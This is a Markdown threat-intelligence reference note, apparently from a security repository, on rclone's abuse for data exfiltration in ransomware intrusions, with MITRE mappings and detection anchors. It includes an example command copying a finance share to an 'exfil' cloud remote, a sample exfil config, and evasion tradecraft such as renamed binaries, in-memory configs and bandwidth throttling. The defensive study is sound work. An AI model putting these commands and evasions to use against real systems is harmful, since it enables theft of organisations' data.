# Rclone — Overview

> 🔴 **Red Flag Principle:** Rclone is now renamed on sight in real intrusions — `svchost.exe` (The DFIR Report's 2021 Sodinokibi/REvil case), `sihosts.exe` (Red Canary), and `TrendFileSecurityCheck.exe` are all documented real-world examples, not hypotheticals. The binary's on-disk name is therefore close to worthless as a detection anchor. What survives every rename is the PE metadata the Go build embeds — `OriginalFileName: rclone.exe`, `ProductName: Rsync for cloud storage`, a company/URL field referencing rclone.org — plus the distinctive `remote:path` argument syntax and verb set (`copy`/`sync`/`move`) that rclone's command model requires no matter what the file is called. **Match on PE metadata and command-line syntax, never on image name alone.**

## Contents
- [History](#history)
- [How It Works](#how-it-works)
- [Techniques / Protocols Used](#techniques--protocols-used)
- [Command-Line Switches — Quick Reference](#command-line-switches--quick-reference)
- [Quick Use-Case List](#quick-use-case-list)
- [Prerequisites](#prerequisites)

---

## History

Rclone is **genuinely open source and actively maintained** — a real contrast to AdFind (closed freeware) and Cobalt Strike (closed commercial) elsewhere in this module. Verified directly against the project's own GitHub repository and blog rather than assumed:

- **Created by Nick Craig-Wood**, who started the codebase in **November 2012** as a learning project for the then newly-released Go 1.0, initially named `swiftsync` (an interface for OpenStack Swift object storage) before being generalized and renamed **rclone**. The project's own tagline, used consistently on [rclone.org](https://rclone.org/) and its [GitHub repo](https://github.com/rclone/rclone), is **"rsync for cloud storage."**
- **First public release, v0.96, shipped with just 3 backends** (Swift, Google Drive, S3) — confirmed via the project's own 10th-anniversary retrospective on the [rclone forum](https://forum.rclone.org/t/rclone-is-10-years-old-today/34185). Promoted to a stable **v1.00 in July 2014**.
- **License: MIT** (confirmed directly against the `COPYING` file in `rclone/rclone`) — genuinely permissive open source, unlike AdFind's non-open freeware model.
- **Current release, checked live for this note: v1.75.0** (GitHub Releases, July 2026) — rclone ships frequent point releases; treat any specific version number here as a snapshot, not a fixed fact, and re-check `github.com/rclone/rclone/releases` at time of use.
- **Rclone Services Ltd**, a commercial entity founded by Craig-Wood, sells support contracts and sponsorship packages (per [rclone.com/about](https://rclone.com/about/)) to fund continued development — it does **not** control the open-source project's license or gate access to the tool itself. Anyone can still clone, build, and run rclone for free with the full backend set.
- **MITRE ATT&CK tracks Rclone as Software [S1040](https://attack.mitre.org/software/S1040/)**, with a procedure-example list spanning an unusually broad set of threat actors for a single dual-use tool: **Akira** (G1024), **Cinnamon Tempest** (G1021, the Cl0p-linked group also tracked as DEV-0401/Emperor Dragonfly), **INC Ransom** (G1032), **Medusa** (G1051), **Storm-0501** (G1053), **Scattered Spider** (G1015), **MuddyWater** (G0069), **WIRTE** (G0090), and **Ember Bear** (G1003) — alongside earlier, extensively documented criminal use by **Conti** and **DarkSide** RaaS affiliates that predates the current S1040 entry's group list.
- **This repo's own `IDEAS.md` cites Rclone via CISA's #StopRansomware advisories for Akira ([AA24-109A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a), most recently updated November 2025) and BlackSuit/Royal ([AA23-061A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a), updated August 2024)** — both name Rclone explicitly, alongside WinSCP, FileZilla, and Mega, as the exfiltration-stage tooling used before ransomware deployment. Both advisories were fetched live for this note; CISA's own site returned an access-restricted response to a direct tool fetch during research, so the specific advisory quotes here are drawn from corroborating secondary reporting that itself cites the advisories, not a first-hand CISA quote — flagged honestly rather than presented as directly verified.
- **Unlike AdFind or Cobalt Strike, Rclone has zero offensive-security origin or intent** — it's a legitimate sysadmin/personal-backup tool with an enormous legitimate install base. That makes it the purest "living-off-the-land, but not actually living off the land (it's not OS-shipped) — bring-your-own-legitimate-tool" case in this module: nothing about the binary itself is suspicious, only its presence, configuration, and command-line context.

## How It Works

### The two-step mental model: define a remote, then move data

Every real rclone operation is one of two things: **configuring a remote** (telling rclone where the cloud destination is and how to authenticate to it) or **moving data** against an already-configured remote. Verified against rclone's own command reference at [rclone.org/commands/](https://rclone.org/commands/):

```
┌─────────────────────────────┐        ┌──────────────────────────────┐
│  rclone config create ...   │        │  rclone copy|sync|move ...    │
│  (or hand-edit rclone.conf, │  ──▶   │  <source> <remote>:<path>     │
│   or pass backend flags     │        │                                │
│   inline with no file at    │        │  HTTPS/SFTP/FTP/WebDAV to the │
│   all — see evasion note)   │        │  destination cloud provider   │
└─────────────────────────────┘        └──────────────────────────────┘
```

```
Attacker/compromised host                          Cloud storage provider
──────────────────────────                         ───────────────────────
rclone.exe copy                                     
  \\fileserver\Shares\Finance                        
  remote:exfil/finance          ──── HTTPS/API ────▶  Bucket/container/folder
        │                                              "remote" resolves to
        │                                              per rclone.conf's
        ├─ 1. Load config (rclone.conf, or --config          [remote] section
        │      override, or in-memory-only if --config
        │      is "" / a null path)
        │
        ├─ 2. Resolve "remote" → backend type + auth   ──▶  Provider authenticates
        │      (type=s3/mega/webdav/... + obscured or         the API call (access
        │      cleartext credential / OAuth token)             key, OAuth token,
        │                                                      user/pass, SSH key)
        ├─ 3. Walk source tree (local FS or a reachable
        │      SMB share), applying any --include/
        │      --exclude/--filter-from scoping
        │
        └─ 4. Stream each file up via the backend's own ──▶  Object/blob/file
               API semantics (multipart PUT, chunked            written at
               upload, etc. — backend-specific)                 destination
```

### The config file — format, location, and the "obscured, not encrypted" trap

Rclone's config is a plain **INI-style file**: one `[remote-name]` section per configured destination, a mandatory `type = <backend>` key naming the backend, and backend-specific key/value pairs beneath it (verified against [rclone.org/docs/#config-file](https://rclone.org/docs/)):

```ini
[exfil]
type = s3
provider = AWS
access_key_id = AKIA...
secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
region = us-east-1

[backup]
type = ftp
host = ftp.example.com
user = svc-backup
pass = *** (obscured, see below)
```

- **Default config path — verified against rclone's own docs, not assumed:**

  | OS | Default location |
  |---|---|
  | Windows | `%APPDATA%\rclone\rclone.conf` |
  | Linux / macOS | `$XDG_CONFIG_HOME/rclone/rclone.conf` if `XDG_CONFIG_HOME` is set, otherwise `~/.config/rclone/rclone.conf` (an older, still-recognized legacy path is `~/.rclone.conf`) |

  `--config <path>` overrides this. **A real evasion option worth flagging explicitly:** setting `--config ""`, `--config notfound`, or `--config /dev/null` keeps the configuration entirely **in memory for that process invocation** — no `rclone.conf` file is ever written to disk, defeating any hunt that only looks for the config file artifact (see `05 - Detection and Hunting.md`'s priority table). This requires passing every backend parameter as an inline flag on the command line instead of via a saved remote, which trades a filesystem artifact for a (usually more visible) long command line.

- **Passwords in the config file are "obscured," not encrypted, and this is a real, verifiable weakness, not editorializing.** Rclone's own `--obscure` flag / `rclone obscure` command runs the password through **AES-256 in CTR mode using a fixed key that is hardcoded directly in rclone's own source** (`fs/config/obscure/obscure.go`, confirmed by reading the function live) — a random IV is generated per value, but the key itself is identical across **every copy of rclone that has ever been built**. Rclone's own documentation is explicit about this: obscuring is "not a secure way of encrypting these passwords... it is to prevent 'eyedropping'" (casual shoulder-surfing), not a real access control. **Practical consequence for an analyst:** an "obscured" password recovered from a seized `rclone.conf` is operationally equivalent to plaintext — any copy of the `rclone` binary (including the analyst's own) can reverse it with `rclone config show` or `rclone obscure --reveal`. Do not treat an obscured credential as protected.
- **Real config-file encryption exists as a separate feature and is meaningfully stronger:** `rclone config` (interactive) can encrypt the **entire file** with a real user-supplied password, and the `RCLONE_CONFIG_PASS` environment variable supplies that password non-interactively (so a wrapper script can run unattended). This does defeat a casual `type rclone.conf` read — NCC Group's research and several DFIR write-ups note operators using this specifically to blunt IR triage. The caveat: if `RCLONE_CONFIG_PASS` is set via an inline environment-variable assignment on the same command that invokes rclone, the value may still be recoverable from process-environment artifacts or command-line/shell-history logging (see `03 - Source Evidence.md`).

### The command model — config vs. the data-movement verbs

| Command family | Purpose |
|---|---|
| `rclone config [create\|show\|file\|password\|encryption\|...]` | Manage remotes — create, inspect, locate, or (re-)password-protect the config |
| `rclone copy <src> <dst>` | One-way, **non-destructive** transfer — copies new/changed files, never deletes anything at the destination |
| `rclone sync <src> <dst>` | One-way **mirror** — makes the destination match the source exactly, which means it **will delete** destination files/objects that no longer exist at the source |
| `rclone move <src> <dst>` | Like `copy`, then deletes the successfully-transferred files from the **source** |
| `rclone ls` / `lsd` / `lsl` / `size` | Read-only listing/recon of a remote or local path — no transfer |
| `rclone check <src> <dst>` | Compares source and destination without transferring anything |
| `rclone mount <remote>:<path> <mountpoint>` | Exposes a remote **as a local filesystem** (FUSE on Linux/macOS/BSD, [WinFsp](https://winfsp.dev) on Windows) |
| `rclone serve <protocol> <remote>:<path>` | The inverse — exposes local (or another remote's) storage **as a server** over a chosen protocol: `webdav`, `http`, `sftp`, `nfs`, `s3`, `dlna`, and others |

The `remote:path` syntax (a colon separating the configured remote's name from a path inside it) is rclone's own invention and appears in **every** data-moving invocation regardless of backend or binary name — this is one of the strongest command-line-content hunting anchors in `05 - Detection and Hunting.md`.

### Backend surface

Rclone's overview page (verified live, [rclone.org/overview/](https://rclone.org/overview/)) currently lists **over 150 supported backends** — far too many to enumerate here, but the subset that shows up repeatedly across real intrusion reporting and MITRE's own S1040 procedure list: **Amazon S3** (and S3-compatible services), **Google Drive**, **Google Cloud Storage**, **Microsoft Azure Blob Storage** / **Azure Files**, **Microsoft OneDrive**, **Dropbox**, **Box**, **Mega**, **pCloud**, **put.io**, **Backblaze B2**, **WebDAV**, **SFTP**, **FTP**, **SMB/CIFS**, **HTTP**, and plain **Local** filesystem. Beyond storage backends, rclone also ships **overlay/wrapper "remotes"** that sit on top of another backend rather than talking to a provider directly:

- **`crypt`** — client-side encryption wrapping any other remote. Content is encrypted with **NaCl SecretBox (XSalsa20 + Poly1305)** in 64 KB chunks; filenames are encrypted with **EME (AES-256)** and re-encoded so the underlying provider only ever sees ciphertext, both for content and (optionally) filenames. Verified against [rclone.org/crypt/](https://rclone.org/crypt/). **Open question, stated honestly:** this is a real, fully-documented capability, but public incident reporting reviewed for this note does not show `crypt` in widespread criminal use the way plain `copy`/`sync` to an unwrapped remote is documented — treat "operator wraps the exfil remote in `crypt` to defeat provider-side content scanning" as a logical, available option rather than a confirmed common technique.
- **`chunker`** — splits large files into smaller pieces before upload, reassembling them transparently on read. This is the mechanism behind MITRE S1040's **T1030 (Data Transfer Size Limits)** procedure entry — lets an operator route large exfil files around a destination's per-file size ceiling.
- **`compress`** — an on-the-fly compression overlay. Plausibly maps to MITRE S1040's own **T1560.001 (Archive Collected Data: Archive via Utility)** procedure note about gzip-style compression before exfiltration, though in most published incident write-ups reviewed for this note the actual archiving step is a **separate tool** (7-Zip, WinRAR) run before rclone ever executes, not this overlay — both are real possibilities and worth distinguishing when reading a specific incident's evidence.
- **`union`, `combine`, `alias`, `hasher`** — structural/utility overlays (combining multiple remotes into one view, path aliasing, hash caching) with no distinct offensive relevance beyond what's already covered above.

## Techniques / Protocols Used

| Layer | Detail |
|---|---|
| Destination transport | HTTPS REST APIs (S3-style, Azure Blob, Google Drive/Cloud Storage, Dropbox, Box, Mega, pCloud, put.io — each backend speaks that provider's own API), WebDAV (HTTP/HTTPS), SFTP (SSH, TCP 22), FTP/FTPS (TCP 21), SMB/CIFS (TCP 445) |
| Source access | Local filesystem, or a reachable SMB/network share — rclone does not itself perform lateral movement or credential theft; it consumes whatever read access the operator's session already has |
| Authentication per backend | Static API key/secret pair (S3-style), OAuth2 token (Drive/OneDrive/Dropbox/Box — stored as a JSON blob in the config), username/password (FTP/WebDAV), or SSH key/password (SFTP) |
| Config protection | `--obscure` (weak, reversible via a hardcoded key — see above), full-file encryption via `RCLONE_CONFIG_PASS`/`rclone config` (real, password-derived) |
| Discovery | `rclone lsd`/`ls`/`lsl` — MITRE S1040's own cited **T1083 (File and Directory Discovery)** procedure |
| Exfiltration technique classes (MITRE S1040) | **T1567.002** (Exfiltration to Cloud Storage — Dropbox/Drive/S3/Mega), **T1048.002** (Exfiltration Over Asymmetric Encrypted Non-C2 Protocol — SFTP, HTTPS WebDAV), **T1048.003** (Exfiltration Over Unencrypted Non-C2 Protocol — FTP, HTTP WebDAV), **T1030** (Data Transfer Size Limits — `chunker`), **T1560.001** (Archive Collected Data — `compress`/external archiver) |

## Command-Line Switches — Quick Reference

Verified against [rclone.org/docs/](https://rclone.org/docs/) and each command's own reference page. Rclone has hundreds of backend-specific flags; the table below covers the cross-cutting global flags that matter for reading an operator's command line, not the full per-backend flag surface.

| Switch | Plain-English meaning |
|---|---|
| `--config <path>` | Use a specific config file instead of the OS default. `--config ""` / `--config notfound` keeps config in-memory only — no file written |
| `--obscure` | Obfuscate a password for storage in the config (weak, reversible — see above) |
| `-n` / `--dry-run` | Show what *would* transfer/delete without actually doing it — an operator's recon/verification pass before committing |
| `-P` / `--progress` | Live transfer progress display — implies an interactive/attended session rather than a silent background run |
| `--transfers <n>` | Number of files transferred in parallel (default 4) — raising this speeds bulk exfil at the cost of more simultaneous outbound connections |
| `--checkers <n>` | Number of parallel checks (default 8) comparing source/destination before transfer |
| `--bwlimit <rate>` | Caps transfer bandwidth (e.g. `--bwlimit 1M`), optionally on a time-based schedule — the throttling knob operators use to blend exfil into a normal traffic baseline |
| `--include <pattern>` / `--exclude <pattern>` | Scope the operation to (or away from) files matching a glob pattern |
| `--filter-from <file>` / `--files-from <file>` | Load include/exclude rules, or an explicit file list, from a file rather than the command line — keeps the actual targeting criteria out of process-command-line logging |
| `-v` / `-vv` | Verbose / extra-verbose logging |
| `--log-file <path>` | Write output to a log file instead of (or in addition to) the console |
| `--ignore-existing` | Skip anything already present at the destination — lets an operator resume a multi-session exfil job without re-transferring completed files |
| `--no-check-certificate` | Skip TLS certificate validation against the destination — seen in real intrusion command lines (e.g. the Sodinokibi/REvil case in `03`/`04`), often paired with a non-standard/self-hosted destination |
| `--multi-thread-streams <n>` | Number of concurrent streams used for large single-file transfers |
| `--auto-confirm` | Suppress interactive confirmation prompts — required for any unattended/scripted invocation |
| `--max-age <duration>` | Only transfer files modified more recently than the given age (e.g. `24h`) — used to scope exfil to freshly modified/high-value data |
| `-c` / `--checksum` | Compare by checksum rather than size+modtime — slower, more certain integrity check |
| `-u` / `--update` | Skip files where the destination is newer |
| `--vfs-cache-mode` | (mount only) Controls local caching behavior for a mounted remote — required for anything beyond strictly sequential writes |

## Quick Use-Case List

- Baseline bulk exfiltration of a share or directory tree to a cloud remote via `copy`
- Renamed-binary execution to defeat filename/hash-based blocking (`svchost.exe`, `sihosts.exe`, `TrendFileSecurityCheck.exe` — all real, separately documented incident names)
- In-memory/no-config-file operation (`--config ""` plus inline backend flags) to avoid ever writing an `rclone.conf` artifact to disk
- Bandwidth-throttled exfiltration (`--bwlimit`) to keep transfer volume under a threshold likely to trip network-anomaly alerting
- Filtered exfiltration targeting specific file types or paths (`--include`/`--exclude`/`--filter-from`) rather than a full-tree copy
- Persistent filesystem-level access via `rclone mount` or `rclone serve` rather than a one-shot transfer
- `--dry-run` recon pass to confirm scope/file counts before committing to the real transfer
- `RCLONE_CONFIG_PASS`-protected config file to defeat casual inspection of stored remote credentials
- Scheduled/persistent exfiltration via a wrapper batch/PowerShell script invoked by a Scheduled Task
- Fleet-wide deployment across multiple hosts using existing lateral-movement tooling already covered in this repo (`Impacket/`, `PsExec/`, Cobalt Strike `jump`)
- `chunker`-backed transfers to split large files past a destination's per-file size limit
- Chained workflow: a C2 implant (Cobalt Strike Beacon, Sliver) drops rclone and a pre-staged config, then executes the transfer as a post-exploitation task
- The unavoidable legitimate baseline — day-to-day admin backup/sync jobs that any hunt built on this tool must be tuned against

Full walkthroughs with commands and MITRE ATT&CK mapping for every item above live in `02 - Hands-On Use Cases.md`.

## Prerequisites

| Requirement | Notes |
|---|---|
| Execution host | Any OS rclone ships a build for (Windows, Linux, macOS, BSD) — `copy`/`sync`/`move` need nothing beyond the binary itself |
| `rclone mount` only | FUSE (`fusermount`/`fusermount3`) on Linux/macOS/BSD, or [WinFsp](https://winfsp.dev) on Windows — an extra dependency not needed for the core transfer verbs |
| Network egress | Reachability to the destination provider's endpoint — typically HTTPS/443, or SFTP/22, FTP/21, WebDAV over HTTP(S) depending on backend choice |
| Destination account/credentials | The operator must already hold (or have created) valid credentials on the destination service — a static API key/secret, an OAuth token, or a username/password, configured into a remote before any transfer can run |
| Source read access | Local disk access, or a reachable SMB/network share the operator's existing session can already read — rclone provides no privilege-escalation or lateral-movement capability of its own |
| No elevation required | The core `copy`/`sync`/`move` workflow needs no admin/SYSTEM privilege beyond whatever is already needed to read the source data |
